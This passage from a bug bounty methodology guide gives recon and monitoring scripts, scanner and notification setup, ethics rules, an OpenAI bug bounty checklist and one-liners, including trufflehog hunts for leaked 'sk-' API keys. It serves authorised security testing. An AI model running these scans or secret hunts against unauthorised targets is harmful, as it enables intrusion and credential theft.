```
❌ Submit without testing
❌ Exaggerate severity
❌ Include offensive language
❌ Submit duplicates
❌ Include unrelated findings
❌ Threaten or demand payment
❌ Disclose publicly before authorization
❌ Submit out-of-scope issues
```

---

## Phase 7: Automation & Monitoring

### 🤖 7.1 Automation Scripts

#### Recon Automation
```bash
#!/bin/bash
# recon.sh - Automated reconnaissance

DOMAIN=$1
OUTPUT_DIR="recon_${DOMAIN}"
mkdir -p $OUTPUT_DIR

echo "[+] Starting reconnaissance for $DOMAIN"

# Subdomain enumeration
echo "[+] Finding subdomains..."
subfinder -d $DOMAIN -o $OUTPUT_DIR/subdomains.txt
assetfinder --subs-only $DOMAIN >> $OUTPUT_DIR/subdomains.txt
sort -u $OUTPUT_DIR/subdomains.txt -o $OUTPUT_DIR/subdomains.txt

# DNS resolution
echo "[+] Resolving subdomains..."
cat $OUTPUT_DIR/subdomains.txt | dnsx -o $OUTPUT_DIR/resolved.txt

# HTTP probing
echo "[+] Probing HTTP services..."
cat $OUTPUT_DIR/resolved.txt | httpx -title -tech-detect -status-code -o $OUTPUT_DIR/live_hosts.txt

# Port scanning
echo "[+] Scanning ports..."
naabu -list $OUTPUT_DIR/resolved.txt -top-ports 1000 -o $OUTPUT_DIR/ports.txt

# Crawling
echo "[+] Crawling websites..."
cat $OUTPUT_DIR/live_hosts.txt | katana -jc -d 3 -o $OUTPUT_DIR/crawl.txt

# JS file extraction
echo "[+] Extracting JS files..."
cat $OUTPUT_DIR/crawl.txt | grep "\.js$" | sort -u > $OUTPUT_DIR/js_files.txt

# Vulnerability scanning
echo "[+] Running Nuclei..."
nuclei -l $OUTPUT_DIR/live_hosts.txt -t ~/nuclei-templates/ -o $OUTPUT_DIR/nuclei_results.txt

# Secret scanning
echo "[+] Scanning for secrets..."
trufflehog github --org=$DOMAIN --only-verified > $OUTPUT_DIR/secrets.txt

echo "[+] Reconnaissance complete! Results saved in $OUTPUT_DIR/"
```

#### Continuous Monitoring
```bash
#!/bin/bash
# monitor.sh - Continuous monitoring for new assets

DOMAIN=$1
OLD_SUBS="old_subdomains.txt"
NEW_SUBS="new_subdomains.txt"

while true; do
    echo "[+] Checking for new subdomains..."
    
    # Get current subdomains
    subfinder -d $DOMAIN -silent > $NEW_SUBS
    
    # Compare with old list
    if [ -f $OLD_SUBS ]; then
        diff $OLD_SUBS $NEW_SUBS | grep "^>" | cut -d' ' -f2 > diff.txt
        
        if [ -s diff.txt ]; then
            echo "[!] New subdomains found:"
            cat diff.txt
            
            # Test new subdomains
            cat diff.txt | httpx | nuclei -t ~/nuclei-templates/
            
            # Notify
            cat diff.txt | notify -silent
        fi
    fi
    
    # Update old list
    cp $NEW_SUBS $OLD_SUBS
    
    # Sleep for 24 hours
    sleep 86400
done
```

### 🔔 7.2 Notification Setup

#### Notify Configuration
```bash
# Install
go install -v github.com/projectdiscovery/notify/cmd/notify@latest

# Configure (~/.config/notify/provider-config.yaml)
slack:
  - id: "slack"
    slack_channel: "bugs"
    slack_username: "recon-bot"
    slack_format: "{{data}}"
    slack_webhook_url: "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"

discord:
  - id: "discord"
    discord_channel: "bugs"
    discord_username: "recon-bot"
    discord_format: "{{data}}"
    discord_webhook_url: "https://discord.com/api/webhooks/YOUR/WEBHOOK"

telegram:
  - id: "telegram"
    telegram_api_key: "YOUR_API_KEY"
    telegram_chat_id: "YOUR_CHAT_ID"

# Usage
echo "New vulnerability found!" | notify
```

### 📊 7.3 Dashboard Setup

#### Nuclei Dashboard
```bash
# Run with JSON output
nuclei -l targets.txt -json -o results.json

# Parse and visualize
cat results.json | jq -r '"\(.info.severity): \(.info.name) - \(.host)"'
```

#### Custom Dashboard (Python)
```python
#!/usr/bin/env python3
# dashboard.py

from flask import Flask, render_template
import json
import os

app = Flask(__name__)

@app.route('/')
def index():
    results = []
    
    # Read results
    if os.path.exists('nuclei_results.json'):
        with open('nuclei_results.json', 'r') as f:
            for line in f:
                try:
                    results.append(json.loads(line))
                except:
                    pass
    
    # Count by severity
    stats = {
        'critical': len([r for r in results if r.get('info', {}).get('severity') == 'critical']),
        'high': len([r for r in results if r.get('info', {}).get('severity') == 'high']),
        'medium': len([r for r in results if r.get('info', {}).get('severity') == 'medium']),
        'low': len([r for r in results if r.get('info', {}).get('severity') == 'low']),
    }
    
    return render_template('dashboard.html', results=results, stats=stats)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

### 🔄 7.4 Workflow Integration

#### Git Hooks for Automation
```bash
#!/bin/bash
# .git/hooks/post-commit

echo "[+] Running security checks..."

# Check for secrets
trufflehog filesystem . --only-verified

# Run SAST
semgrep --config=auto .

echo "[+] Security checks complete"
```

#### CI/CD Integration
```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Run TruffleHog
        run: |
          docker run --rm -v $(pwd):/src trufflesecurity/trufflehog:latest filesystem /src
      
      - name: Run Semgrep
        run: |
          pip3 install semgrep
          semgrep --config=auto .
      
      - name: Run Nuclei
        run: |
          docker run --rm -v $(pwd):/app projectdiscovery/nuclei -u https://staging.target.com
```

---

## 🎓 Advanced Techniques & Tips

### 💡 7.5 Pro Tips

#### Scope Expansion
```
1. Find acquisitions and subsidiaries
2. Look for wildcard scopes (*.target.com)
3. Check mobile apps for hidden endpoints
4. Review JavaScript for API endpoints
5. Find staging/dev environments
6. Check old wayback snapshots
```

#### Low-Hanging Fruits
```
✅ Default credentials
✅ Information disclosure
✅ Subdomain takeovers
✅ CORS misconfigurations
✅ Missing rate limiting
✅ Exposed .git directories
✅ Sensitive files in robots.txt
✅ Debug endpoints enabled
```

#### Time Management
```
Daily Schedule:
- 2 hours: Reconnaissance
- 3 hours: Manual testing
- 2 hours: Automation/tool development
- 1 hour: Report writing
- 1 hour: Learning new techniques
```

### 📚 7.6 Learning Resources

#### Essential Reading
```
Books:
- Web Application Hacker's Handbook
- The Tangled Web
- Real-World Bug Hunting

Websites:
- PortSwigger Web Security Academy
- HackerOne Hacktivity
- Bugcrowd University
- OWASP Testing Guide
- PentesterLab

YouTube Channels:
- NahamSec
- STÖK
- InsiderPhD
- LiveOverflow
- IppSec
```

#### Practice Platforms
```
- HackTheBox
- TryHackMe
- PentesterLab
- PortSwigger Web Security Academy
- DVWA (Damn Vulnerable Web Application)
- bWAPP
- WebGoat
```

### 🏆 7.7 Success Metrics

#### Track Your Progress
```
Spreadsheet columns:
- Date
- Program
- Vulnerability Type
- Severity
- Bounty Amount
- Status
- Time Spent
- Lessons Learned
```

#### KPIs to Monitor
```
- Submission rate (bugs/week)
- Acceptance rate (%)
- Average bounty
- Critical/High findings (%)
- Time to first bug
- Programs participated
```

---

## 🔐 Security & Ethics

### ⚖️ Legal Considerations

#### Always Follow
```
✅ Only test authorized targets
✅ Respect scope limitations
✅ Follow responsible disclosure
✅ Don't access/modify others' data
✅ Stop when you find vulnerability
✅ Report immediately
✅ Keep findings confidential
✅ Follow local laws
```

#### Never Do
```
❌ Test without authorization
❌ Attack out-of-scope targets
❌ DDoS or degrade services
❌ Steal or destroy data
❌ Social engineer employees
❌ Physical attacks
❌ Extort or threaten
❌ Disclose without permission
```

---

## 🎯 Target-Specific Checklist (OpenAI Example)

### OpenAI Bug Bounty Quick Checklist

#### Before Testing
```
✅ Read program policy thoroughly
✅ Note out-of-scope items
✅ Create @bugcrowdninja.com account
✅ Understand model issues are OUT OF SCOPE
✅ Review known issues list
✅ Check for active bonuses (IDOR 2x!)
```

#### Testing Priority
```
1. IDOR on ChatGPT/API (Bonus active!)
2. Atlas browser sandbox escape
3. Sora private data access
4. API authentication bypass
5. Payment manipulation
6. Third-party data leaks
7. Unreleased feature discovery
```

#### Reporting Checklist
```
✅ Submit through Bugcrowd (not email)
✅ API keys through special form
✅ Include detailed PoC
✅ Verify it's not a known issue
✅ Clear, professional write-up
✅ Realistic impact assessment
```

---

## 📊 Final Workflow Summary

```
┌─────────────────────────────────────────────┐
│         Phase 1: OSINT & Recon              │
│  Subfinder → Amass → Crt.sh → GitHub        │
│  Output: subdomains.txt                      │
└──────────────────┬──────────────────────────┘
                   ↓
┌─────────────────────────────────────────────┐
│      Phase 2: Active Reconnaissance          │
│  Httpx → Naabu → Katana → JS Analysis       │
│  Output: live_hosts.txt, endpoints.txt       │
└──────────────────┬──────────────────────────┘
                   ↓
┌─────────────────────────────────────────────┐
│      Phase 3: Enumeration                    │
│  FFuF → Kiterunner → Arjun                  │
│  Output: directories.txt, api_endpoints.txt  │
└──────────────────┬──────────────────────────┘
                   ↓
┌─────────────────────────────────────────────┐
│      Phase 4: Vulnerability Scanning         │
│  Nuclei → Dalfox → SQLMap → Manual Testing  │
│  Output: vulnerabilities.txt                 │
└──────────────────┬──────────────────────────┘
                   ↓
┌─────────────────────────────────────────────┐
│      Phase 5: Exploitation & PoC            │
│  Develop exploits, create PoCs, document    │
│  Output: poc_videos, screenshots            │
└──────────────────┬──────────────────────────┘
                   ↓
┌─────────────────────────────────────────────┐
│      Phase 6: Reporting                      │
│  Write report, assess severity, submit      │
│  Output: Bounty report → $$                │
└─────────────────────────────────────────────┘
```

---

## 🚀 Quick Start Commands

```bash
# One-liner for quick recon
echo target.com | subfinder -silent | httpx -silent | nuclei -silent

# Full automated recon
bash recon.sh target.com

# IDOR testing setup (2 accounts required)
# 1. Login as User A in Browser 1
# 2. Login as User B in Browser 2
# 3. Use Burp Autorize extension
# 4. Test all ID parameters

# API key hunting
trufflehog github --org=target --only-verified | grep -E "sk-|sess-"

# Quick vulnerability scan
nuclei -l targets.txt -severity critical,high -o critical_vulns.txt
```

---

**Remember:** Quality over quantity. One critical bug is worth more than 100 low-severity findings!

Good luck hunting! 🎯🔥
